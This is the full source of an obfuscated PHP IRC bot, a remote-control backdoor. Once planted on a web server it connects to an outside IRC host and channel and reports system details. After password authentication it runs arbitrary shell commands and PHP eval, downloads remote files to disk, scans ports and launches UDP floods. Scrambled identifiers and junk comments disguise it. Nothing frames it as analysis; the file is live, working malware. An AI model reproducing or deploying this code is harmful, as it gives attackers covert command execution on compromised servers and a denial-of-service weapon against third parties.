<?php set_time_limit(0); error_reporting(0);  class qWZbHwqwkzHNKEZhk {

 /* A7kBVHnveAGE7UfVnfNd8Yi2jJ81FNZ5LaxwHKRMaog78mTlrxpqlyiv7hmDUbyvbVRJwzlxNrv */

 var $NzwbWNQkHnKWktn = array("etqNQHkZeQNQtKWB"=>"gangbang.angels-agency.nl",
                     "ztWz"=>"25343",
                     "qKnzt"=>"scary",
                     "BhnKBB"=>"13",
                     "QWQBKwK"=>"#wWw#",
                     "HBz"=>"scan",
                     "wqQentEEn"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "bTZqtqQBEB"=>".",
                     "beqWWTHqBqT"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $users = array(); 

 /* EKxDqRjRfpiTmlI4I6v0XU1Dzl5tmSOQsckJTtrZIzIVKhPjda91U1ujdqDp8i6rkg14AiT9IsU */ function aAYyaaDGjv($to,$msg)
 {
    $this->DjPjJsM("NOTICE $to :$msg");
 } function jYmvGPpmmysPmSvymYJ() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "\0034ON\003"; }
    else { $safemode = "\0039OFF\003"; }

	$unme = php_uname();
	if($unme == "") { $mname = "\00315---\003"; }
	else { $mname = "\00315".$unme."\003"; }
		 
	 $url = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 $pth = "\00315".getcwd()."\003";
		  
	$pthh =  getcwd()."";
	$xoOlooIFCC = fileperms("$pthh");

	if (($xoOlooIFCC & 0xC000) == 0xC000) { $IcuFXCliLlc = 's';
	} elseif (($xoOlooIFCC & 0xA000) == 0xA000) { $IcuFXCliLlc = 'l';
	} elseif (($xoOlooIFCC & 0x8000) == 0x8000) { $IcuFXCliLlc = '-';
	} elseif (($xoOlooIFCC & 0x6000) == 0x6000) { $IcuFXCliLlc = 'b';
	} elseif (($xoOlooIFCC & 0x4000) == 0x4000) { $IcuFXCliLlc = 'd';
	} elseif (($xoOlooIFCC & 0x2000) == 0x2000) { $IcuFXCliLlc = 'c';
	} elseif (($xoOlooIFCC & 0x1000) == 0x1000) { $IcuFXCliLlc = 'p';
	} else { $IcuFXCliLlc = 'u'; }

	// Owner
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0100) ? 'r' : '-');
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0080) ? 'w' : '-');
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0040) ?	(($xoOlooIFCC & 0x0800) ? 's' : 'x' ) :	(($xoOlooIFCC & 0x0800) ? 'S' : '-'));
	// Group
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0020) ? 'r' : '-');
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0010) ? 'w' : '-');
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0008) ?	(($xoOlooIFCC & 0x0400) ? 's' : 'x' ) :	(($xoOlooIFCC & 0x0400) ? 'S' : '-'));
	// World
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0004) ? 'r' : '-');
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0002) ? 'w' : '-');
	$IcuFXCliLlc .= (($xoOlooIFCC & 0x0001) ?	(($xoOlooIFCC & 0x0200) ? 't' : 'x' ) :	(($xoOlooIFCC & 0x0200) ? 'T' : '-'));
			
	$rghts = "\00315".$IcuFXCliLlc."\003";

	$this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"\00314[SAFE:\003\2 $safemode\2\00314]\00315 $url \00314[pwd:]\00315 $pth \00314(\003$rghts\00314) [uname:]\00315 $mname");
 } function VjdpsAgsS($host) 
 { 
    $this->users[$host] = true; 
 } function ADApAAyyVDVPG() 
 { 
    if(!($this->IrCXcXffI = fsockopen($this->NzwbWNQkHnKWktn['etqNQHkZeQNQtKWB'],$this->NzwbWNQkHnKWktn['ztWz'],$e,$s,30))) 
    $this->ADApAAyyVDVPG(); 
    $this->pSsPaMJmJAVDyggDP();
    if(strlen($this->NzwbWNQkHnKWktn['qKnzt'])>0) 
    $this->DjPjJsM("PASS ".$this->NzwbWNQkHnKWktn['qKnzt']);
    $this->gGsavSYaJsaGPjDa();
    $this->GssDAVYjyGvAag();
 }

 /* iAzsDArvljQvm6ZB48ymjEdd5lX4TfP2Gfk9FCvRMbdY83q31Ofajjeev19e7O7DTiDpKY7m0ab */ function pSsPaMJmJAVDyggDP() {
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $size = strlen($chars);
  for($i=0;$i<6;$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  if(php_uname() == "") { $uname = "---"; } else { $uname = php_uname(); }
  $this->DjPjJsM("USER ".$str."-gc 127.0.0.1 localhost :".$uname."");
 } function DjPjJsM($msg) 
 { 
    fwrite($this->IrCXcXffI,"$msg\r\n"); 
 } function PVMAVGPvYYyj($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 }function GssDAVYjyGvAag() 
 { 
    while(!feof($this->IrCXcXffI)) 
    { 
       $this->buf = trim(fgets($this->IrCXcXffI,512)); 
       $bKkTNwkqbwtWw = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->DjPjJsM("PONG :".substr($this->buf,6)); 
       } 
       if(isset($bKkTNwkqbwtWw[1]) && $bKkTNwkqbwtWw[1] =="004") 
       { 
          $this->DjPjJsM("MODE ".$this->nick." ".$this->NzwbWNQkHnKWktn['']); 
          $this->DjPjJsM("JOIN ".$this->NzwbWNQkHnKWktn['QWQBKwK']." ".$this->NzwbWNQkHnKWktn['HBz']."");
          $this->aSmypg($this->NzwbWNQkHnKWktn['QWQBKwK'],$this->NzwbWNQkHnKWktn['HBz']);
          $this->jYmvGPpmmysPmSvymYJ();
       } 
       if(isset($bKkTNwkqbwtWw[1]) && $bKkTNwkqbwtWw[1]=="433") 
       { 
          $this->gGsavSYaJsaGPjDa(); 
       } 
	/* Z4rSV6YWf71jsSjxQXujHCNWdCUqtVsiPK0BGOnLLeV4X5rDSMNqfrdjTXAdISloscPZR3At7mn */
       if($this->buf != $old_buf) 
       { 
          $HnKzNqZQwnNqet = array(); 
          $III = substr(strstr($this->buf," :"),2); 
          $xIrI = explode(" ",$III); 
          $xffIu = explode("!",$bKkTNwkqbwtWw[0]); 
          $ifOcCu = explode("@",$xffIu[1]); 
          $ifOcCu = $ifOcCu[1]; 
          $xffIu = substr($xffIu[0],1); 
          $olUfCRU = $bKkTNwkqbwtWw[0]; 
          if($xIrI[0]==$this->xffIu) 
          { 
           for($i=0;$i<count($xIrI);$i++) 
              $HnKzNqZQwnNqet[$i] = $xIrI[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($xIrI);$i++) 
              $HnKzNqZQwnNqet[$i] = $xIrI[$i]; 
          } 
          if(count($bKkTNwkqbwtWw)>2) 
          { 
             switch($bKkTNwkqbwtWw[1]) 
             { 
                case "QUIT": 
                   if($this->PVMAVGPvYYyj($olUfCRU)) 
                   { 
                      $this->jVSGVVmA($olUfCRU); 
                   } 
                break; 
                case "PART": 
                   if($this->PVMAVGPvYYyj($olUfCRU)) 
                   { 
                      $this->jVSGVVmA($olUfCRU); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->PVMAVGPvYYyj($olUfCRU) && (md5($ifOcCu) == $this->NzwbWNQkHnKWktn['beqWWTHqBqT'] || $this->NzwbWNQkHnKWktn['beqWWTHqBqT'] == "*")) 
                   { 
                      if(substr($HnKzNqZQwnNqet[0],0,1)==$this->NzwbWNQkHnKWktn['bTZqtqQBEB']) 
                      { 
                         switch(substr($HnKzNqZQwnNqet[0],1)) 
                         { 
                            case "user": 
                              if(md5($HnKzNqZQwnNqet[1])==$this->NzwbWNQkHnKWktn['wqQentEEn']) 
                              { 
                                 $this->VjdpsAgsS($olUfCRU);
                              } 
                              else 
                              { 
                                 $this->aAYyaaDGjv($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2Auth\2]: Foute password $xffIu idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   } 
		     /* ViEp0h2hmkkv48V7GDiVWlAL2tclrpydx3soalvmvFIpDtnaXwWJHmlzGnLYD9103ke3vAgR6O7 */
                   elseif($this->PVMAVGPvYYyj($olUfCRU)) 
                   { 
                      if(substr($HnKzNqZQwnNqet[0],0,1)==$this->NzwbWNQkHnKWktn['bTZqtqQBEB']) 
                      { 
                         switch(substr($HnKzNqZQwnNqet[0],1)) 
                         {                            case "logout": 
                               $this->jVSGVVmA($olUfCRU); 
                               $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[auth:]\00314 Je bent nu uitgelogt $xffIu"); 
			    break;                            case "system": 
                               $command = substr(strstr($III,$HnKzNqZQwnNqet[0]),strlen($HnKzNqZQwnNqet[0])+1); 
                               $exec = system($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"      : ".trim($ret[$i])); 
			    break;                            case "exec": 
                               $command = substr(strstr($III,$HnKzNqZQwnNqet[0]),strlen($HnKzNqZQwnNqet[0])+1); 
                               $exec = exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"      : ".trim($ret[$i])); 
			    break;                            case "die": 
                               $this->DjPjJsM("QUIT :die command from $xffIu");
                               fclose($this->IrCXcXffI); 
                               exit;                            case "passthru": 
                               $command = substr(strstr($III,$HnKzNqZQwnNqet[0]),strlen($HnKzNqZQwnNqet[0])+1); 

                               $exec = passthru($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"      : ".trim($ret[$i])); 
			    break;                            case "rndnick": 
                               $this->gGsavSYaJsaGPjDa(); 
			    break;                            case "udpflood": 
                               if(count($HnKzNqZQwnNqet)>3) 
                               { 
                                  $this->ADjsDmdVmJMypPMgjA($HnKzNqZQwnNqet[1],$HnKzNqZQwnNqet[2],$HnKzNqZQwnNqet[3]); 
                               } 
			    break;                            case "info":
				   $this->jYmvGPpmmysPmSvymYJ();
			    break;                            case "sexec":
                               $command = substr(strstr($III,$HnKzNqZQwnNqet[0]),strlen($HnKzNqZQwnNqet[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"      : ".trim($ret[$i])); 
			    break;                            case "download": 
                               if(count($HnKzNqZQwnNqet) > 2) 
                               { 
                                  if(!$fp = fopen($HnKzNqZQwnNqet[2],"w")) 
                                  {  
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[download:]\00314 Kon bestand niet downloaden. Toestemming geweigerd."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($HnKzNqZQwnNqet[1])) 
                                     { 
                                        $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[download:]\00314 Kan bestand \2".$HnKzNqZQwnNqet[1]."\2 niet downloaden."); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[download:]\00314 Bestand \2".$HnKzNqZQwnNqet[1]."\2 gedownload naar \2".$HnKzNqZQwnNqet[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               }
                               else { $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[download:]\00314 Typ \".download http://your.host/file /tmp/file\""); }
			    break;                            case "popen": 
                               if(isset($HnKzNqZQwnNqet[1])) 
                               { 
                                  $command = substr(strstr($III,$HnKzNqZQwnNqet[0]),strlen($HnKzNqZQwnNqet[0])+1); 
                                  $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               }  
			    break;                            case "restart": 
                               $this->DjPjJsM("QUIT :gerestart door $xffIu");
                               fclose($this->IrCXcXffI); 
                               $this->ADApAAyyVDVPG(); 
			    break;                            case "raw":
                               $this->DjPjJsM(strstr($III,$HnKzNqZQwnNqet[1])); 
			    break;                            case "pscan": 
                               if(count($HnKzNqZQwnNqet) > 2) 
                               { 
                                  if(fsockopen($HnKzNqZQwnNqet[1],$HnKzNqZQwnNqet[2],$e,$s,15)) 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2pscan\2]: ".$HnKzNqZQwnNqet[1].":".$HnKzNqZQwnNqet[2]." is \2open\2"); 
                                  else 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2pscan\2]: ".$HnKzNqZQwnNqet[1].":".$HnKzNqZQwnNqet[2]." is \2closed\2"); 
                               } 
			    break;                            case "dns": 
                               if(isset($HnKzNqZQwnNqet[1])) 
                               { 
                                  $ip = explode(".",$HnKzNqZQwnNqet[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2dns\2]: ".$HnKzNqZQwnNqet[1]." => ".gethostbyaddr($HnKzNqZQwnNqet[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2dns\2]: ".$HnKzNqZQwnNqet[1]." => ".gethostbyname($HnKzNqZQwnNqet[1])); 
                                  } 
                               } 
			    break;                            case "eval":
                              $eval = eval(substr(strstr($III,$HnKzNqZQwnNqet[1]),strlen($HnKzNqZQwnNqet[1])));
			    break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->ADApAAyyVDVPG(); 
 } function ADjsDmdVmJMypPMgjA($host,$packetsize,$time) {
	$this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->dmYMSsgvSas($this->NzwbWNQkHnKWktn['QWQBKwK'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
 } function aSmypg($chan,$key=NULL) 
 { 
    $this->DjPjJsM("JOIN $chan $key"); 
 } function gGsavSYaJsaGPjDa() {
  $chars = 'abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789';	
  $size = strlen($chars);
  for($i=0;$i<$this->NzwbWNQkHnKWktn['BhnKBB'];$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  $this->DjPjJsM("NICK ".$str."");
 } function dmYMSsgvSas($to,$msg)
 {
    $this->DjPjJsM("PRIVMSG $to :$msg");
 } function jVSGVVmA($host) 
 { 
    unset($this->users[$host]); 
 }}
$UfIllcRR = new qWZbHwqwkzHNKEZhk;
$UfIllcRR->ADApAAyyVDVPG(); ?>